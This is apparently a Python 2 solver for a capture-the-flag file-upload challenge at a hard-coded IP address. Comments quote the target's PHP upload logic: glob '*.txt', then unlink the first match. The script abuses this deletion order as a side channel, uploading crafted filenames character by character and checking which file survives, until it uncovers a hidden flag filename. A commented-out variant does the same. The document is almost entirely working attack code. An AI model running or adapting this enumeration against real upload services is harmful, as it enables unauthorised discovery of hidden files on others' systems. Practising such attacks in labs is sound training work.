#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
# // <?
# // move_uploaded_file($tmp_name,$path.$name);  
# // echo htmlspecialchars(file_get_contents($path.$name));
# // $f=glob("*.txt");
# // unlink($f[0]);

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:44.0) Gecko/20160101 Firefox/55.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2',
           'Accept-Encoding': 'gzip, deflate'
           }
url = 'http://104.224.169.128:801/tasks/fileup2/'

# strs = ' !"$%&\'()*+,-./0123456789:;<=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
strs = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
secret = '' #f3eykla2Lg

while len(secret) < 40:
    for i in strs:
        filename = secret
        filename += i
        files = {'upfile': (filename+'.txt', 'hahaha', 'text/plain'),
                    'submit':(None,u'上传')}
        print filename
        res = requests.post(url=url, headers=headers, files=files) 
        if 'key' in res.content.lower():
            print '[+] flag found ! '
            print res.content
            exit()
        if requests.get(url=url+'upload/'+filename+'.txt', headers=headers).status_code == 200:
            secret += strs[strs.index(i)-1]
            print "flag:"+secret
            break


'''
def upload(filename):
    url = 'http://104.224.169.128:801/tasks/fileup2/index.php'
    files = {'upfile': (filename+'.txt', 'hahaha', 'text/plain'),
                'submit':(None,u'上传')}
    count = 0
    while count < 2:
        try:
            response = requests.post(url=url, headers=headers, files=files)
            if 'key' in response.content.lower():
                print '[+] flag found ! '
                print response.content
                return 'exit'
            if 'hahaha' in response.content:
                return check(filename)
        except Exception, e:
            print e
            count += 1

def check(filename):
    url = 'http://104.224.169.128:801/tasks/fileup2/upload/' + filename + '.txt'
    try:
        response = requests.get(url=url, headers=headers)
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        pass

if __name__ == '__main__':
    flag_file_name = ''
    flag = ''
    strs = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    while len(flag_file_name) < 40:
        for i in strs:
            print "check:"+flag_file_name + i
            flag = upload(flag_file_name + i)
            if flag == True:
                if strs.index(i) > 0:
                    flag_file_name += strs[strs.index(i)-1]
                else:
                    flag_file_name += '0'
                break
            elif flag == 'exit':
                print '[+] flag file is : ', flag_file_name + i
                exit()
        print flag_file_name

'''